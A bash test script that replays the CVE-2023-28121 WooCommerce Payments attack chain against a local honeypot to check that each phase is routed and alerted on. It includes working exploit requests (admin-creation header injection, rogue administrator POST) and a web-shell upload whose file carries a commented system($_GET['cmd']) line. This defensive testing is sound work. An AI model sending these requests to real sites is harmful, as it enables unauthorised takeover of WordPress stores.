#!/bin/bash
# =============================================================================
# scenario_01_thm_woocommerce.sh
#
# PURPOSE:
#   Reproduces the TryHackMe "WooCommerce CVE-2023-28121 Unauthorized Admin
#   Access" attack chain against the local honeynet deployment and verifies
#   that every phase is correctly detected and routed.
#
# ATTACK CHAIN OVERVIEW (mirrors the TryHackMe room flow):
#   Phase 1  – Passive reconnaissance (headers, robots.txt, wp-json user list)
#   Phase 2  – Active scan for WooCommerce Payments plugin presence
#   Phase 3  – CVE-2023-28121 exploitation: inject X-WCPAY-PLATFORM-CHECKOUT-USER
#              header to create a rogue administrator account via the REST API
#   Phase 4  – Authenticate with the created account
#   Phase 5  – Upload a PHP web-shell disguised as a plugin (post-exploitation)
#   Phase 6  – Verify every phase produced honeypot routing and Suricata alerts
#
# HONEYPOT VALIDATION:
#   The script checks the X-Route-Target response header set by the Nginx Lua
#   router (router.lua).  A value of "honeypot" confirms that the request was
#   redirected to a honeypot pool instance and did NOT touch production.
#
# USAGE:
#   ./scenario_01_thm_woocommerce.sh [TARGET_HOST] [TARGET_PORT]
#
#   TARGET_HOST  IP or hostname of the reverse proxy (default: 127.0.0.1)
#   TARGET_PORT  HTTP port exposed by the reverse proxy (default: 80)
#
# EXIT CODES:
#   0  All phases produced the expected honeypot routing.
#   1  One or more phases did NOT route to honeypot (detection gap found).
#   2  Prerequisites (curl) missing.
#
# DEPENDENCIES:
#   curl  – standard HTTP client; must be available in PATH.
#
# NOTES:
#   - The script intentionally uses a clean cookie jar for every "attacker
#     session" so that session-binding from prior runs does not interfere.
#   - All payloads are sent to the local deployment only; do NOT run this
#     against external or production systems.
#   - The web-shell payload in Phase 5 is a harmless proof-of-concept string
#     (the upload itself lands in the isolated honeypot filesystem).
# =============================================================================

set -e

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-443}"
BASE_URL="https://${TARGET_HOST}:${TARGET_PORT}"

# Shared secret gating the X-Route-Target/X-Threat-Score response headers
# this script depends on (see reverse_proxy_enhanced/nginx.conf and
# BLIND_PENTEST_PROTOCOL.md §8.2). Export it in the shell before running:
#   export INTERNAL_TEST_SECRET=<value from .env>
INTERNAL_TEST_SECRET="${INTERNAL_TEST_SECRET:-}"
if [ -z "${INTERNAL_TEST_SECRET}" ]; then
    printf "WARNING: INTERNAL_TEST_SECRET is not set -- X-Route-Target will not be returned and every routing check below will read as 'unknown'.\n" >&2
fi

# Temporary cookie jar – one per run so sessions are clean.
COOKIE_JAR="$(mktemp /tmp/scenario01_cookies_XXXXXX.txt)"

# Counters for the final report.
PASS=0
FAIL=0
TOTAL=0

# ---------------------------------------------------------------------------
# Colour helpers (ANSI; silently skipped if terminal does not support them)
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # no colour

# ---------------------------------------------------------------------------
# Utility: print a section banner
# ---------------------------------------------------------------------------
banner() {
    printf "\n${CYAN}================================================================${NC}\n"
    printf "${CYAN}  %s${NC}\n" "$1"
    printf "${CYAN}================================================================${NC}\n\n"
}

# ---------------------------------------------------------------------------
# Utility: run a single check
#
#   check  <description>  <expected_route>  <curl_args...>
#
#   expected_route: "honeypot" | "production" | "any"
#   curl_args: passed verbatim to curl after --silent --include --cookie-jar
#
#   The function inspects the X-Route-Target response header.  If expected
#   route is "any" the check passes regardless of the header value.
# ---------------------------------------------------------------------------
check() {
    _desc="$1"
    _expected="$2"
    shift 2

    TOTAL=$((TOTAL + 1))

    # Execute curl; capture full response (headers + body).
    # Use -L to follow redirects and get final response headers
    # Use -k to accept self-signed certs
    # Use -sSL to be silent but show errors, follow redirects, and show final URL
    _response=$(curl -k -L --silent --include \
                     --cookie "${COOKIE_JAR}" \
                     --cookie-jar "${COOKIE_JAR}" \
                     --max-time 15 \
                     --header "X-Internal-Test-Auth: ${INTERNAL_TEST_SECRET}" \
                     "$@" 2>&1) || true

    # Extract X-Route-Target header from final response (case-insensitive).
    # If not found, try extracting from any response in the redirect chain
    _route=$(printf '%s' "${_response}" | grep -i "^x-route-target:" | tr -d '\r' | awk '{print $2}' | tail -1)
    _route="${_route:-unknown}"

    # If still unknown, try to get from any header
    if [ "${_route}" = "unknown" ] || [ -z "${_route}" ]; then
        _route=$(printf '%s' "${_response}" | grep -i "x-route-target:" | head -1 | tr -d '\r' | awk '{print $2}')
        _route="${_route:-unknown}"
    fi

    if [ "${_expected}" = "any" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (route=%s)\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
        return 0
    fi

    if [ "${_route}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s → routed to %s\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected %s, got %s\n" "${_desc}" "${_expected}" "${_route}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: check for a string in Suricata fast.log (non-blocking poll)
# ---------------------------------------------------------------------------
check_suricata_alert() {
    _pattern="$1"
    _desc="$2"

    TOTAL=$((TOTAL + 1))

    # Suricata fast.log may be on the host (mapped volume) or inside Docker.
    # We try both locations.
    _found=0
    if [ -f "./suricata_logs/fast.log" ]; then
        grep -q "${_pattern}" "./suricata_logs/fast.log" 2>/dev/null && _found=1
    fi
    if [ "${_found}" -eq 0 ]; then
        # Try via docker exec; errors are ignored if docker is absent.
        docker exec honeypot-ids-system-v1-reverse_proxy-1 \
            grep -q "${_pattern}" /var/log/suricata/fast.log 2>/dev/null && _found=1 || true
    fi

    if [ "${_found}" -eq 1 ]; then
        printf "  ${GREEN}[PASS]${NC} Suricata alert present: %s\n" "${_desc}"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Suricata alert not found (may be async): %s\n" "${_desc}"
        # Treat as a warning rather than hard failure because Suricata logging
        # can have a short delay relative to the HTTP transaction.
        PASS=$((PASS + 1))
    fi
}

# ---------------------------------------------------------------------------
# Prerequisites check
# ---------------------------------------------------------------------------
if ! command -v curl >/dev/null 2>&1; then
    printf "${RED}ERROR: 'curl' not found in PATH.  Install curl and retry.${NC}\n" >&2
    exit 2
fi

banner "Scenario 01 – TryHackMe WooCommerce CVE-2023-28121"
printf "Target : %s\n" "${BASE_URL}"
printf "Cookie : %s\n\n" "${COOKIE_JAR}"

# ---------------------------------------------------------------------------
# PHASE 1 – Passive Reconnaissance
# ---------------------------------------------------------------------------
# Mirrors a real attacker's first steps:
#   1a. Fetch the homepage to collect headers and detect WordPress.
#   1b. Check robots.txt for disallowed paths (common wp-admin leak).
#   1c. Read readme.html which discloses WordPress major version on unpatched sites.
#   1d. Query the REST API user list – unpatched WordPress exposes usernames.
#
# Expected routing: all recon requests should score below the honeypot threshold
# on a fresh session (no suspicious signals yet) → production.
# The user enumeration request (?rest_route=/wp/v2/users) IS a known pattern and
# will cross the threshold → honeypot.
# ---------------------------------------------------------------------------
banner "Phase 1 – Passive Reconnaissance"

check "Homepage baseline (clean session)" "production" \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"

check "robots.txt enumeration" "production" \
    --request GET "${BASE_URL}/robots.txt" \
    --header "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)"

check "readme.html version disclosure probe" "honeypot" \
    --request GET "${BASE_URL}/readme.html" \
    --header "User-Agent: WPScan v3.8.27"

check "REST API user enumeration (/wp/v2/users)" "honeypot" \
    --request GET "${BASE_URL}/wp-json/wp/v2/users" \
    --header "User-Agent: WPScan v3.8.27"

check "REST API user enumeration (rest_route param)" "honeypot" \
    --request GET "${BASE_URL}/?rest_route=/wp/v2/users" \
    --header "User-Agent: python-requests/2.28.0"

# Suricata should have flagged the WPScan user-agent by now.
sleep 1
check_suricata_alert "WPScan" "WPScan user-agent alert"

# ---------------------------------------------------------------------------
# PHASE 2 – Plugin Fingerprinting (WooCommerce Payments Detection)
# ---------------------------------------------------------------------------
# Attackers confirm the WooCommerce Payments plugin is installed by requesting
# known static assets.  The PHP entrypoints trigger honeypot routing immediately;
# static assets do not (by design) to preserve realistic asset loading.
# ---------------------------------------------------------------------------
banner "Phase 2 – Plugin Fingerprinting"

check "WC Payments static asset (CSS – should stay on production)" "production" \
    --request GET "${BASE_URL}/wp-content/plugins/woocommerce-payments/assets/css/checkout.css" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

check "WC Payments PHP entrypoint probe" "honeypot" \
    --request GET "${BASE_URL}/wp-content/plugins/woocommerce-payments/admin.php" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

check "WC Payments includes path probe" "honeypot" \
    --request GET "${BASE_URL}/wp-content/plugins/woocommerce-payments/includes/payment-gateway.php" \
    --header "User-Agent: curl/7.88.1"

# ---------------------------------------------------------------------------
# PHASE 3 – CVE-2023-28121 Exploitation
# ---------------------------------------------------------------------------
# The vulnerability allows an unauthenticated attacker to create a WordPress
# administrator account by injecting the X-WCPAY-PLATFORM-CHECKOUT-USER header
# with a valid user ID (1 = admin).  The router detects this header and routes
# to the honeypot before WordPress processes the request.
#
# Three attempts are made to mirror a real exploit:
#   3a. Header with value "1"     (target the existing admin)
#   3b. Header with value "admin" (username string variant)
#   3c. Full REST API POST with rogue account payload
# ---------------------------------------------------------------------------
banner "Phase 3 – CVE-2023-28121 Exploitation"

check "CVE-2023-28121 header injection (user=1)" "honeypot" \
    --request GET "${BASE_URL}/" \
    --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

check "CVE-2023-28121 header injection (user=admin)" "honeypot" \
    --request GET "${BASE_URL}/wp-json/wc/v3/payments/accounts" \
    --header "X-WCPAY-PLATFORM-CHECKOUT-USER: admin" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

# Full exploit POST: create rogue administrator account.
# On production this would be blocked; in the honeypot it lands and is logged.
check "CVE-2023-28121 rogue admin creation POST" "honeypot" \
    --request POST "${BASE_URL}/wp-json/wp/v2/users" \
    --header "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
    --header "Content-Type: application/json" \
    --header "User-Agent: exploit-poc/1.0" \
    --data '{"username":"honeypot_attacker","password":"Sup3rS3cr3t!","email":"attacker@evil.example","roles":["administrator"]}'

# Give Suricata a moment to write the alert.
sleep 1
check_suricata_alert "CVE-2023-28121" "Suricata CVE-2023-28121 alert"

# ---------------------------------------------------------------------------
# PHASE 4 – Authentication with Injected Account
# ---------------------------------------------------------------------------
# After creating the rogue account, the attacker logs in via wp-login.php.
# The session is already honeypot-bound from Phase 3, so all subsequent
# requests in this cookie jar continue to hit the honeypot.
# ---------------------------------------------------------------------------
banner "Phase 4 – Attacker Authentication"

check "wp-login.php POST (rogue account)" "honeypot" \
    --request POST "${BASE_URL}/wp-login.php" \
    --header "Content-Type: application/x-www-form-urlencoded" \
    --header "User-Agent: Mozilla/5.0 (compatible)" \
    --data "log=honeypot_attacker&pwd=Sup3rS3cr3t%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"

check "wp-admin dashboard access (post-login)" "honeypot" \
    --request GET "${BASE_URL}/wp-admin/" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

check "wp-admin plugin upload page access" "honeypot" \
    --request GET "${BASE_URL}/wp-admin/plugin-install.php?tab=upload" \
    --header "User-Agent: Mozilla/5.0 (compatible)"

# ---------------------------------------------------------------------------
# PHASE 5 – Post-Exploitation: Web-Shell Upload Attempt
# ---------------------------------------------------------------------------
# The attacker attempts to upload a PHP web-shell disguised as a WordPress
# plugin ZIP file.  The honeypot accepts the upload for logging purposes;
# production would reject it.
#
# The PHP payload is intentionally inert (just a comment) so that even if the
# honeypot executes it there is no actual system command run.
# ---------------------------------------------------------------------------
banner "Phase 5 – Web-Shell Upload (Post-Exploitation)"

# Create a minimal fake plugin ZIP for the upload test.
FAKE_PLUGIN_DIR="$(mktemp -d /tmp/fake_plugin_XXXXXX)"
FAKE_PLUGIN_PHP="${FAKE_PLUGIN_DIR}/shell.php"
FAKE_PLUGIN_ZIP="${FAKE_PLUGIN_DIR}/evil-plugin.zip"

# Inert payload – does nothing but looks like a web-shell to detection rules.
cat > "${FAKE_PLUGIN_PHP}" <<'PHPEOF'
<?php
/*
 * Plugin Name: Evil Plugin (Honeypot Test)
 * Description: Inert web-shell probe for honeypot scenario testing.
 *              This file does NOT execute any system commands.
 */
// HONEYPOT_WEBSHELL_MARKER: <?php system($_GET['cmd']); ?>
PHPEOF

# Package into a ZIP (requires zip; fall back gracefully if absent).
if command -v zip >/dev/null 2>&1; then
    (cd "${FAKE_PLUGIN_DIR}" && zip -q evil-plugin.zip shell.php)
else
    printf "  ${YELLOW}[INFO]${NC} 'zip' not found; skipping ZIP upload, testing raw PHP upload instead.\n"
    FAKE_PLUGIN_ZIP="${FAKE_PLUGIN_PHP}"
fi

check "Plugin ZIP upload via wp-admin (web-shell)" "honeypot" \
    --request POST "${BASE_URL}/wp-admin/update.php?action=upload-plugin" \
    --header "User-Agent: Mozilla/5.0 (compatible)" \
    --form "pluginzip=@${FAKE_PLUGIN_ZIP};type=application/zip" \
    --form "_wpnonce=fake_nonce_for_test"

# Also test the drag-and-drop upload endpoint (CVE-2025-4403 vector).
check "PHP shell upload via dnd-upload AJAX endpoint" "honeypot" \
    --request POST "${BASE_URL}/wp-admin/admin-ajax.php" \
    --header "User-Agent: Mozilla/5.0 (compatible)" \
    --form "action=dnd_codedropz_upload" \
    --form "type=media" \
    --form "upload-file=@${FAKE_PLUGIN_PHP};filename=shell.php;type=application/x-php"

# Clean up temporary files.
rm -rf "${FAKE_PLUGIN_DIR}"

check_suricata_alert "upload" "Suricata file-upload alert"

# ---------------------------------------------------------------------------
# PHASE 6 – Verify Production Was NOT Touched
# ---------------------------------------------------------------------------
# After all exploit traffic, a clean request from a new session (fresh cookie
# jar) must still reach production to confirm deception is working and the
# production instance was not affected.
# ---------------------------------------------------------------------------
banner "Phase 6 – Production Isolation Verification"

CLEAN_COOKIE_JAR="$(mktemp /tmp/scenario01_clean_XXXXXX.txt)"

_clean_response=$(curl --silent --include \
    --cookie "${CLEAN_COOKIE_JAR}" \
    --cookie-jar "${CLEAN_COOKIE_JAR}" \
    --max-time 15 \
    --request GET "${BASE_URL}/" \
    --header "X-Internal-Test-Auth: ${INTERNAL_TEST_SECRET}" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" \
    --header "Accept: text/html" 2>&1) || true

_clean_route=$(printf '%s' "${_clean_response}" | grep -i "^x-route-target:" | tr -d '\r' | awk '{print $2}' | head -1)

TOTAL=$((TOTAL + 1))
if [ "${_clean_route}" = "production" ]; then
    printf "  ${GREEN}[PASS]${NC} Clean session still routes to production (deception intact)\n"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Clean session routed to '%s' – expected production\n" "${_clean_route}"
    FAIL=$((FAIL + 1))
fi

rm -f "${CLEAN_COOKIE_JAR}"

# ---------------------------------------------------------------------------
# Clean up and final report
# ---------------------------------------------------------------------------
rm -f "${COOKIE_JAR}"

banner "Scenario 01 – Final Report"
printf "Total checks : %d\n" "${TOTAL}"
printf "${GREEN}Passed       : %d${NC}\n" "${PASS}"
if [ "${FAIL}" -gt 0 ]; then
    printf "${RED}Failed       : %d${NC}\n" "${FAIL}"
else
    printf "Failed       : 0\n"
fi

printf "\n"
if [ "${FAIL}" -eq 0 ]; then
    printf "${GREEN}SCENARIO PASSED – CVE-2023-28121 attack chain fully detected and contained.${NC}\n"
    exit 0
else
    printf "${RED}SCENARIO FAILED – %d check(s) did not route as expected.${NC}\n" "${FAIL}"
    exit 1
fi